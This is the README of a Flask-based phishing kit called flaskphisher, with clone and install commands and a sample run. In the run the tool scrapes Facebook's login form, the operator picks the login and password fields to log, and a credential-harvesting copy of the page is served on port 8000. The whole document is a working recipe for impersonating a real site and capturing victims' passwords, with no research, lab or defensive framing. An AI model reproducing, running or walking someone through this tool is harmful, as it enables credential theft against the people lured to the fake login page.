# flaskphisher
Phishing web app generator made in flask

[![forthebadge](https://forthebadge.com/images/badges/made-with-python.svg)](https://forthebadge.com)

# Installation
```
git clone https://github.com/krishpranav/flaskphisher
cd flaskphisher
chmod +x *
pip3 install virtualenv
python3 -m venv env
```

# Getting Started
```
python -m pip install -r requirements.txt
python template/app.py 'https://facebook.com/login'
[*] Found forms:
FORM 0 --> /session
Form to log: 0
Selected form 0

[*] Form fields:
0 - utf8
1 - authenticity_token
2 - login
3 - password
4 - commit
Fields to log (comma separated, e.g 1,4,5): 2,3
Logging: ['login', 'password']

[*] Phishing page ready !
Run now ? (y/n)y
* Running on http://0.0.0.0:8000/ (Press CTRL+C to quit)
```
